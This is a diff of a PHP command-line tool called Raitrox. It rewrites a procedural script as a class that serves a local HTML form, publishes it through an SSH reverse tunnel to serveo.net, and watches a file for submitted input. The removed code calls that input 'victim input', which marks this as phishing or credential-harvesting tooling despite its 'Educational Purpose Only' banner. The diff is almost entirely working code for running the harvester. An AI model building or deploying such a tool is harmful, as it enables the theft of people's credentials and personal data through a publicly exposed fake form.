@@ -14,129 +14,211 @@
  * ========================================================================================
  */
 
-// Clear the console screen based on the OS
-system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");
+declare(strict_types=1);
 
-// Check if the script is running in CLI mode
-if (php_sapi_name() !== "cli") {
-  die("\033[31mThis tool must be run from the command line.\n\033[0m");
-}
+class RaitroxServer {
+    private string $host;
+    private int $port;
+    private string $responseDir;
+    private string $formFile;
+    private string $sshOutputFile;
+    private string $inputFile;
 
-// Print ASCII art in red
-echo "\033[31m"; // Start red color
-echo "██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗\n";
-echo "██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝\n";
-echo "██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ \n";
-echo "██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ \n";
-echo "██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗\n";
-echo "╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n";
-echo "                                                     \n";
-echo "\033[0m"; // Reset to default color
-
-echo "\033[31mNote: For Educational Purposes Only\n\033[0m";
-//Function To Get Random poort
-function get_random_port()
-{
-  return rand(1024, 65535);
-}
-// Define the local server host and port
-$host = "localhost";
-$port = get_random_port();
-// Capture the start time for server startup performance measurement
-$start_time = microtime(true);
-
-// Start the built-in PHP server in the background
-$server = shell_exec("php -S $host:$port > /dev/null 2>&1 & echo $!");
-
-// Capture the end time after server startup
-$end_time = microtime(true);
-
-// Calculate the time taken to start the server in milliseconds
-$time_taken = ($end_time - $start_time) * 1000;
-
-// Check if the server started successfully
-if ($server) {
-  echo "Starting server on http://$host:$port\n";
-  echo "\033[32mServer started successfully in " .
-    round($time_taken, 2) .
-    " milliseconds.\n\033[0m";
-} else {
-  echo "\033[31mError: Server could not be started.\n\033[0m";
-}
-
-// Define the path to the form file (index.php)
-$form_file = "index.html";
-
-// Check if the form file exists
-if (!file_exists($form_file)) {
-  die("Error: The form file index.php is missing. Please create the form.\n");
-}
-
-// Setup response directory and files for SSH output and user input handling
-$response_dir = "response";
-$input_file = "$response_dir/input.txt";
-$ssh_output_file = "$response_dir/ssh_output.txt"; // Store SSH output
-
-// Create the response directory if it doesn't exist
-if (!file_exists($response_dir)) {
-  mkdir($response_dir, 0777, true);
-}
-
-// Create input.txt and ssh_output.txt if they don't exist
-if (!file_exists($input_file)) {
-  touch($input_file);
-}
-if (!file_exists($ssh_output_file)) {
-  touch($ssh_output_file);
-  echo "Created $ssh_output_file for SSH output.\n";
-}
-
-// Establish an SSH tunnel using Serveo
-echo "\033[32mEstablishing SSH tunnel...\033[0m\n";
-$ssh_command = "ssh -R 80:localhost:$port serveo.net > $ssh_output_file 2>&1 &";
-exec($ssh_command);
-
-// Wait for the SSH tunnel to establish and fetch the tunnel URL
-$tunnel_url = null;
-while ($tunnel_url === null) {
-  if (file_exists($ssh_output_file)) {
-    $lines = file(
-      $ssh_output_file,
-      FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
-    );
-    foreach ($lines as $line) {
-      if (strpos($line, "http") !== false) {
-        $tunnel_url = $line;
-        echo "\033[32mTunnel URL: $tunnel_url\033[0m\n";
-        break;
-      }
+    public function __construct(
+        string $host = 'localhost',
+        ?int $port = null,
+        string $responseDir = 'response',
+        string $formFile = 'index.html'
+    ) {
+        $this->host = $host;
+        $this->port = $port ?? $this->getRandomPort();
+        $this->responseDir = $responseDir;
+        $this->formFile = $formFile;
+        $this->sshOutputFile = "$responseDir/ssh_output.txt";
+        $this->inputFile = "$responseDir/input.txt";
     }
-  }
-  sleep(1); // Wait for SSH output to be written
-}
 
-// Start monitoring input from input.txt
-echo "\e[33mWaiting for victim input...\n\e[0m";
-echo "\e[34mPress Ctrl+C to stop.\e[0m\n";
+    private function displayLogo(): void {
+        echo "\033[38;5;196m"; // Bright red color
+        echo "██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗\n";
+        echo "██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝\n";
+        echo "██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ \n";
+        echo "██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ \n";
+        echo "██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗\n";
+        echo "╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n";
+        echo "\033[0m\n"; // Reset color
 
-while (true) {
-  clearstatcache();
-
-  // Check for new input in input.txt
-  if (file_exists($input_file)) {
-    $input = file_get_contents($input_file);
-
-    if (!empty($input)) {
-      echo "-------------------------------------\n";
-      echo "Input received: \n";
-      echo "\033[32m$input\033[0m\n"; // Display input in green
-      echo "-------------------------------------\n";
-
-      // Clear the input file after reading
-      file_put_contents($input_file, "");
+        $this->displayColoredBox("Educational Purpose Only - Use Responsibly", "196");
+        echo "\n";
     }
-  }
 
-  // Wait for 2 seconds before checking again
-  sleep(2);
+    private function displayColoredBox(string $text, string $colorCode): void {
+        $length = strlen($text) + 4;
+        $border = str_repeat("═", $length);
+        
+        echo "\033[38;5;{$colorCode}m"; // Set color
+        echo "╔{$border}╗\n";
+        echo "║  $text  ║\n";
+        echo "╚{$border}╝\n";
+        echo "\033[0m"; // Reset color
+    }
+
+    private function displayStatusMessage(string $message, string $type = 'info'): void {
+        $colors = [
+            'success' => '82',  // Light green
+            'error' => '196',   // Light red
+            'info' => '87',     // Cyan
+            'warning' => '214'  // Orange
+        ];
+        
+        $color = $colors[$type] ?? '15'; // Default to white
+        $prefix = match($type) {
+            'success' => '✓',
+            'error' => '✗',
+            'warning' => '⚠',
+            default => 'ℹ'
+        };
+        
+        echo "\033[38;5;{$color}m{$prefix} {$message}\033[0m\n";
+    }
+
+    private function getRandomPort(): int {
+        return random_int(1024, 65535);
+    }
+
+    private function validateEnvironment(): void {
+        if (php_sapi_name() !== 'cli') {
+            throw new RuntimeException('This tool must be run from the command line.');
+        }
+    }
+
+    private function setupEnvironment(): void {
+        system(PHP_OS_FAMILY === 'Windows' ? 'cls' : 'clear');
+        
+        if (!file_exists($this->responseDir)) {
+            mkdir($this->responseDir, 0755, true);
+            $this->displayStatusMessage("Created response directory", 'success');
+        }
+
+        foreach ([$this->inputFile, $this->sshOutputFile] as $file) {
+            if (!file_exists($file)) {
+                touch($file);
+                $this->displayStatusMessage("Created file: " . basename($file), 'success');
+            }
+        }
+
+        if (!file_exists($this->formFile)) {
+            throw new RuntimeException("Required file missing: {$this->formFile}");
+        }
+    }
+
+    private function startServer(): float {
+        $startTime = microtime(true);
+        
+        $command = sprintf(
+            'php -S %s:%d > /dev/null 2>&1 & echo $!',
+            $this->host,
+            $this->port
+        );
+        
+        $pid = shell_exec($command);
+        
+        if (empty($pid)) {
+            throw new RuntimeException('Failed to start the server');
+        }
+        
+        return (microtime(true) - $startTime) * 1000;
+    }
+
+    private function establishSSHTunnel(): ?string {
+        $this->displayStatusMessage("Establishing SSH tunnel...", 'info');
+        
+        $ssh_command = "ssh -R 80:localhost:{$this->port} serveo.net > {$this->sshOutputFile} 2>&1 &";
+        exec($ssh_command);
+
+        $maxAttempts = 30;
+        $attempts = 0;
+        
+        while ($attempts < $maxAttempts) {
+            if (file_exists($this->sshOutputFile)) {
+                $lines = file($this->sshOutputFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+                foreach ($lines as $line) {
+                    if (strpos($line, 'http') !== false) {
+                        return trim($line);
+                    }
+                }
+            }
+            $attempts++;
+            sleep(1);
+        }
+        
+        throw new RuntimeException('Failed to establish SSH tunnel after 30 seconds');
+    }
+
+    private function monitorInput(): void {
+        $this->displayColoredBox("Input Monitoring Started", "87");
+        $this->displayStatusMessage("Press Ctrl+C to stop", 'info');
+        echo "\n";
+
+        $lastCheck = 0;
+        
+        while (true) {
+            clearstatcache();
+            
+            if (file_exists($this->inputFile)) {
+                $currentTime = filemtime($this->inputFile);
+                
+                if ($currentTime > $lastCheck) {
+                    $input = file_get_contents($this->inputFile);
+                    
+                    if (!empty($input)) {
+                        echo "\n";
+                        $this->displayColoredBox("New Input Received", "82");
+                        echo "\033[38;5;82m" . $input . "\033[0m\n";
+                        echo str_repeat("─", 50) . "\n";
+                        
+                        file_put_contents($this->inputFile, "");
+                        $lastCheck = $currentTime;
+                    }
+                }
+            }
+            
+            sleep(2);
+        }
+    }
+
+    public function start(): void {
+        try {
+            $this->validateEnvironment();
+            $this->displayLogo();
+            $this->setupEnvironment();
+            
+            $startupTime = $this->startServer();
+            $this->displayStatusMessage(
+                sprintf("Server started (%.2f ms)", $startupTime),
+                'success'
+            );
+            $this->displayStatusMessage(
+                sprintf("Local URL: http://%s:%d", $this->host, $this->port),
+                'info'
+            );
+            
+            $tunnelUrl = $this->establishSSHTunnel();
+            if ($tunnelUrl) {
+                $this->displayStatusMessage("Tunnel established", 'success');
+                $this->displayStatusMessage("Public URL: $tunnelUrl", 'info');
+            }
+            
+            echo "\n";
+            $this->monitorInput();
+            
+        } catch (Exception $e) {
+            $this->displayStatusMessage("Error: " . $e->getMessage(), 'error');
+            exit(1);
+        }
+    }
 }
+
+// Initialize and start the server
+$server = new RaitroxServer();
+$server->start();
